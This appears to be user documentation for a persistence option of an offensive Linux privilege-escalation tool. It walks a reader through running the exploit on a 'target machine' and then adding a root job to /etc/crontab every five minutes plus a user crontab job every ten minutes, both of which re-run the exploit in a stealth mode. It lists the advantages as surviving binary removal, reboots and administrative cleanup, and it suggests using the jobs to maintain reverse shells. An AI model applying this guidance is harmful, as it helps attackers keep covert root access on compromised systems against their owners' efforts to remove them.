# Option 3: Install Cron Persistence

## Overview

**Purpose:** Creates scheduled tasks (cron jobs) that automatically re-execute your exploit at regular intervals, ensuring persistent access even if the binary is removed.

**How It Works:**
1. Adds a cron job to system crontab (`/etc/crontab`) that runs every 5 minutes as root
2. Adds a cron job to user crontab that runs every 10 minutes
3. Each execution runs your exploit in stealth mode
4. Provides automatic re-establishment of access

---

## Step-by-Step Instructions

### Step 1: Run the Exploit and Gain Root Access

**Location:** Target machine

```bash
./comprehensive

# Wait for privilege escalation
# You should see: [INFO] Successfully gained root privileges!
```

### Step 2: Select Option 3 from the Menu

**Location:** Target machine

When the menu appears, select option 3:

```
Select option: 3
```

### Step 3: Verify Installation

**Location:** Target machine

You should see:
```
[INFO] Installing cron persistence
[INFO] Cron persistence installed
```

---

## What Gets Installed

### System Crontab Entry

**Location:** `/etc/crontab`

**Added line:**
```
*/5 * * * * root /path/to/comprehensive --stealth
```

**Meaning:**
- Runs every 5 minutes (`*/5`)
- Executes as root user
- Runs the exploit in stealth mode

### User Crontab Entry

**Location:** User's crontab (accessed via `crontab -l`)

**Added line:**
```
*/10 * * * * /path/to/comprehensive --check
```

**Meaning:**
- Runs every 10 minutes (`*/10`)
- Executes as the current user
- Uses `--check` flag (if implemented)

**Note:** The path used is automatically detected from `/proc/self/exe` (current executable path).

---

## Verification

### Check System Crontab

**Location:** Target machine

```bash
# View system crontab
cat /etc/crontab | grep comprehensive

# Or view all system cron jobs
cat /etc/crontab
```

**Expected output:**
```
*/5 * * * * root /path/to/comprehensive --stealth
```

### Check User Crontab

**Location:** Target machine

```bash
# View your user's crontab
crontab -l | grep comprehensive

# Or view all user cron jobs
crontab -l
```

**Expected output:**
```
*/10 * * * * /path/to/comprehensive --check
```

### Check Cron Service Status

**Location:** Target machine

```bash
# Verify cron service is running
systemctl status cron

# Or on some systems
systemctl status crond

# Start if not running
sudo systemctl start cron
```

---

## How It Works

### Automatic Execution

The cron jobs execute automatically:

1. **Every 5 minutes** - System cron runs as root:
   ```bash
   /path/to/comprehensive --stealth
   ```
   This re-executes your exploit, re-establishing root access.

2. **Every 10 minutes** - User cron runs:
   ```bash
   /path/to/comprehensive --check
   ```
   This provides a secondary persistence mechanism.

### Execution Flow

When cron executes:

1. Cron daemon triggers the job at scheduled time
2. Exploit binary is executed with specified flags
3. If binary exists, it runs and escalates privileges again
4. If binary was removed, job fails silently (until you restore it)

---

## Advantages

1. **Automatic Re-establishment:** Access is re-established every 5 minutes
2. **Survives Binary Removal:** As long as cron job exists, it will try to re-execute
3. **Multiple Layers:** Both system and user crontabs provide redundancy
4. **Stealthy:** Runs in stealth mode to reduce detection
5. **Persistent:** Survives reboots (cron service auto-starts)

---

## Use Cases

### Maintaining Access

Even if your exploit binary is deleted, the cron job remains. If you restore the binary to the same path, it will automatically re-execute.

### Regular Check-ins

The cron job ensures regular execution, useful for:
- Maintaining reverse shells
- Re-establishing access after system updates
- Ensuring persistence survives administrative cleanup

### Stealth Operation

Running with `--stealth` flag reduces logging and visibility during scheduled execution.

---

## Important Notes

### Path Dependency

**Critical:** The cron job uses the absolute path where your exploit was located. If you:
- Move the binary to a different location → cron job will fail
- Delete the binary → cron job will fail silently

**Solution:** Ensure the binary stays in the same location, or update the cron job path.

### Detection

Cron jobs are easily discoverable:

```bash
# System administrators can find them:
cat /etc/crontab
crontab -l

# Cron logs show executions:
grep comprehensive /var/log/syslog
grep comprehensive /var/log/cron
journalctl -u cron | grep comprehensive
```

### Stealth Mode

The system cron job uses `--stealth` flag, which:
- Reduces verbose logging
- Lowers process priority
- Minimizes detection signature

---

